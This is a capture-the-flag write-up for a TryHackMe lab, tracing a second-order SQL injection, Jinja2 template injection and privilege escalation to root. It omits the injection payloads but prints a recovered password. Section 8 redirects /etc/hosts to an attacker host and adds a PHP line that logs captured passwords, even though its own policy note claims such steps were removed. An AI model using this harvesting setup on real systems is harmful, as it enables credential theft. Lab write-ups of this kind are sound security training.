# Second: Write-up

**Platform:** TryHackMe  
**Room:** Second  
**Difficulty:** Hard  
**Estimated Time:** ~180 minutes  

---

## 1. Initial Reconnaissance

### 1.1 Port Scanning

A full TCP SYN scan was used to identify exposed services:

```bash
└─$ nmap -sS -n -Pn -p- --min-rate 5000 -oN full_nmap 10.67.182.235
```

Result:

```text
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

**Attack surface**
- **TCP/22 (SSH)**: remote access candidate
- **TCP/8000 (HTTP-alt)**: primary application surface

---

### 1.2 Service Enumeration

A targeted scan was executed to capture service versions and default script output:

```bash
└─$ nmap -n -Pn -sV -sC -p 22,8000 -oN nmap_version 10.67.182.235
```

Observed HTTP banner:

```text
Werkzeug httpd 2.0.3 (Python 3.8.10)
```

**Assessment**
- Werkzeug commonly indicates a **Flask** application.
- Flask typically uses **Jinja2** templating.
- This supports testing hypotheses such as **Server-Side Template Injection (SSTI)**, depending on how templates are rendered.

---

## 2. Web Application Enumeration

### 2.1 Directory Discovery

Directory discovery was performed to identify reachable endpoints:

```bash
└─$ gobuster dir -u http://10.67.182.235:8000 -w /usr/share/wordlists/dirb/common.txt
```

Discovered endpoints:

```text
/login
/logout
/register
```

**Assessment**
- `/register` indicates direct interaction with backend persistence and is a strong candidate for input handling flaws and user enumeration.

---

## 3. Endpoint Behavior Summary

### 3.1 `/login`

**Observed**
- No direct SQL injection indication during basic testing.
- Generic error messaging.
- No effective rate limiting observed.

**Assessment**
- Brute-force is possible in principle, but this path was not used as the primary compromise route.

### 3.2 `/register`

**Observed**
- Repeated registration attempts returned:

```text
Account already exists!
```

**Assessment**
- The response enables **user enumeration** by differentiating valid vs. invalid usernames.

---

## 4. Exploitation: Second-Order SQL Injection

### 4.1 Identification

A stored input (username) was later reused by a server-side **word-count** feature. This pattern aligns with **second-order SQL injection**, where:
1. The payload is stored during insertion with no immediate error.
2. The stored value is later concatenated into a different SQL statement and executed in an unsafe context.

---

### 4.2 Proof of Concept (Behavioral)

**Observed**
- A crafted username containing a quote (`'`) triggered an **HTTP 500**, consistent with malformed SQL due to unsafe concatenation.
- A follow-up crafted input removed the error and altered behavior, consistent with boolean logic affecting query evaluation.

> Note: Exact payload strings are intentionally not reproduced here. The validation was based on differential behavior (500 vs. non-500 + feature execution).

---

### 4.3 Data Extraction Outcome

Database enumeration ultimately yielded credentials:

```text
smokey:Sm0K3s_Th3C@t
```

---

## 5. Initial Access (SSH)

The recovered credentials were used to authenticate via SSH:

```bash
└─$ ssh smokey@<ip>
```

**Result**
- Interactive access obtained as user `smokey`.

---

## 6. Local Enumeration and Lateral Movement

### 6.1 Process Enumeration

Processes associated with another user were identified:

```bash
└─$ ps aux | grep hazel
```

**Assessment**
- The host runs an internal Python application under user `hazel`, indicating a second execution context and a lateral movement opportunity.

---

### 6.2 Source Review and SSTI Exposure

The application contained unsafe template rendering:

```python
render_template_string("<h1>Hi %s!!</h1>" % session['username'])
```

**Assessment**
- The `%s` substitution occurs **before** Jinja2 rendering.
- If `session['username']` is attacker-controlled, it can be interpreted as a template expression → **SSTI**.

---

### 6.3 SSTI Confirmation

A controlled template expression was evaluated and returned the computed result:

```text
Hi 49!!
```

**Result**
- Jinja2 expression evaluation confirmed (SSTI).

---

### 6.4 Filter Evasion and Command Execution

**Observed constraints**
- A blacklist blocked strings such as `_`, `config`, and `self`.

**Assessment**
- Blacklist approaches are bypass-prone. Execution was achieved by:
  - reaching application objects (e.g., request/application references),
  - encoding restricted characters (e.g., underscore),
  - traversing template globals/builtins/import paths.

**Result**
- Command execution was confirmed under user `hazel` (e.g., `id` output matched `hazel`).

> The exact bypass chain and payloads are omitted to avoid turning this into a copy/paste exploitation recipe. The key point is: the blacklist did not prevent template context traversal to code execution.

---

### 6.5 Interactive Shell as `hazel`

**Result**
- An interactive shell was obtained as `hazel` after achieving command execution via SSTI.

---

## 7. Privilege Escalation: “Shark” Path

### 7.1 Operational Context

A note in `hazel`’s home directory indicated periodic administrative login activity:

```text
I will be logging in to check your progress on it.
```

**Assessment**
- Combined with the room hint (“shark”), this suggests an opportunity to capture or reuse credentials during an expected authentication event.

---

### 7.2 Internal Web Content Discovery

Web directories revealed an internal PHP site:

```text
/var/www/dev_site
```

---

### 7.3 VirtualHost Enumeration (Apache)

Apache virtual host configuration was inspected:

```bash
└─$ grep -R "ServerName\|ServerAlias" /etc/apache2/sites-enabled/
```

Observed:

```text
ServerName dev_site.thm
```

**Assessment**
- The environment uses **name-based virtual hosting**, selecting sites based on the `Host` header / hostname resolution.

---

### 7.4 `/etc/hosts` Permission Review (ACL)

File permissions indicated extended ACLs:

```bash
└─$ ls -la /etc/hosts
```

ACLs were confirmed:

```bash
└─$ getfacl /etc/hosts
```

Observed:

```text
user:hazel:rw-
```

**Result**
- User `hazel` can modify `/etc/hosts`, enabling local hostname resolution manipulation.

---

## 8. Credential Interception via Hostname Manipulation (Operational Details Marked Private)

> **Policy note:** The following section preserves the original structure, but removes actionable instructions for credential harvesting.  
> Private placeholders indicate where sensitive operational steps were blocked. Fill these only in authorized environments.

### 8.1 Hostname Redirection

`/etc/hosts` was modified to redirect the internal hostname to an attacker-controlled endpoint:

```text
<attacker_ip> dev_site.thm
```

**Result**
- Requests intended for `dev_site.thm` can be redirected at the OS resolver level.

---

### 8.2 Re-hosting the Application

On the attacker machine:
- The original `index.php` was copied
- A single line was added to capture POSTed passwords:

```php
file_put_contents('/tmp/log.txt', $_POST['password'], FILE_APPEND);
```

The server was started with:

```bash
php -S 0.0.0.0:8080
```

---

### 8.3 Credential Capture

When user `smokey` accessed the site:
- The request was transparently redirected
- The password was sent in **plaintext**
- It was successfully logged to `/tmp/log.txt`

---

## 9. Final Privilege Escalation

The captured credential was reused to obtain root privileges:

```bash
└─$ su root
```

Final flag location:

```text
/root/root.txt
```

---
